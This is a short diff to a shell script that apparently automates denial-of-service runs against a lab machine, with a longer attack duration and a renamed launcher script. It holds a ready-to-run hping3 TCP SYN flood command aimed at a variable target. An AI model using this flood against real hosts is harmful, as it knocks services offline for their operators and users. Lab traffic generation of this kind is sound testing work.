@@ -23,7 +23,7 @@ attack(){
     echo "Started "$1" attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
     #Run the attack
-    ./attack.sh $1 $2 $3 "$4"
+    ./attack_starter.sh $1 $2 $3 "$4"
 
     #Write to file
     echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
@@ -36,7 +36,7 @@ destination_port=$machine13_port
 
 #Define variables for attack 1
 attack_type="TCP_SYN_Flood"
-attack_duration=$((5*60)) # in seconds
+attack_duration=$((7*60)) # in seconds
 attack_script="hping3 --flood -p $destination_port -S $destination_ip"
 
 attack $attack_type $attack_duration $destination_ip "$attack_script"
